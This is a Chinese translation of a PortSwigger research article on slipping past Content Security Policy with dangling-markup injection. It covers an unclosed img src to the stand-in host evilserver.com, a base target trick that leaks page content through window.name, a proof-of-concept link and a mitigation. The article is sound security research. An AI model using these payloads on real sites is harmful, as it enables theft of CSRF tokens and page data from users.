# Evading CSP with DOM-based dangling markup（利用基于 DOM 的悬挂标记规避 CSP）

> 作者：**Gareth Heyes**（研究员）  
> Twitter：[@garethheyes](https://twitter.com/garethheyes)

- **发布时间：** 2018 年 7 月 18 日（星期三）14:09 UTC
- **更新日期：** 2021 年 7 月 19 日（星期一）07:19 UTC

[悬挂标记（Dangling markup）](http://lcamtuf.coredump.cx/postxss/) 是一种无需脚本即可窃取页面内容的技术，它利用图片等资源将数据发送到攻击者控制的远程位置。当[反射型 XSS](/web-security/cross-site-scripting/reflected) 无效或被[内容安全策略](/web-security/cross-site-scripting/content-security-policy)（[CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)）阻止时，这种方法非常有用。其思路是注入一些不完整的 HTML（例如一个图片标签的 `src` 属性），页面上的其余标记会闭合该属性，同时将两者之间的数据发送到远程服务器。例如，假设我们有一个注入点位于某个脚本和表单的上方，如下所示：

```
INJECTION HERE <b>test</b>
<script>
token = 'supersecret';
</script>
<form action="blah"></form>
```

如果我们注入一个带有未闭合 `src` 属性的图片标签，如下所示：

```html
<img src="https://evilserver.com/?
```

那么从注入点到下一个双引号之间的代码将被发送到远程服务器，这可能包含敏感信息，如 [CSRF](/web-security/csrf) 令牌。注入后的效果如下（高亮部分为发送到服务器的内容）：

```
<img src="https://evilserver.com/?<b>test</b>
<script>
token = 'supersecret';
</script>
<form action="blah">
```

## 使用 base target 绕过严格的 CSP

[CSP](/web-security/cross-site-scripting/content-security-policy) 允许开发者阻止加载外部资源以防止此类攻击。然而，我发现了一种新技术，即使面对非常严格的 CSP（例如 `default-src 'none'; base-uri 'none';`）也能生效。

上述 CSP 会阻止带有未闭合 `src` 属性的图片向量，因为策略不允许加载任何图片资源或其他子资源。但我们可以使用 `base` 标签来绕过此限制。利用 `base` 标签的 [`target`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base#attr-target) 属性，我们可以更改页面上每个链接的 [`window name`](https://developer.mozilla.org/en-US/docs/Web/API/Window/name)。通过注入一个不完整的 `target` 属性，`window.name` 将被设置为注入点之后直到页面上每个链接对应引号之前的所有标记，从而允许我们窃取令牌或注入点与下一个引号之间的任何内容。

为了让攻击者检索数据，受害者只需点击该链接即可，因为 `window.name` 在跨域下是暴露的，攻击者只需读取 `window.name` 属性即可。注入示例如下：

```html
<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><b><base target="blah</b>
```

上面的注入中，`target` 属性仍未闭合，页面中的标记随后成为 `name` 的剩余部分，攻击者只需读取窗口名称即可。攻击者控制的页面位于不同域，由受害者导航访问，其内容如下：

```html
<script>alert("The extracted content is:" + name);</script>
```

[概念验证链接](http://portswigger-labs.net/dangling_markup/?x=%3Ca%20href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html%3E%3Cfont%20size=100%20color=red%3EYou%20must%20click%20me%3C/font%3E%3C/a%3E%3Cbase%20target=%22blah)

## 缓解措施

你可以通过在注入点之前放置自己的 `base` 标签来防止 `base` 标签注入，这样第二个 `base` 标签就无法覆盖 `target`。例如：

```html
<base target="_self" />
```

## 不使用 base 标签的基于 DOM 的悬挂标记

当然，我尝试打破这种缓解措施，并提出了一种无需使用 `base` 标签即可绕过 XSS Auditor 和 CSP 的技术。其思路是注入一个带有 `target` 属性的表单，提交表单后会再次将页面提交给自己（通过普通链接）。第一次点击通过 `target` 设置 `window.name`，然后你需要再次点击链接才能从 `window.name` 中检索数据，因此需要两次点击而非一次。
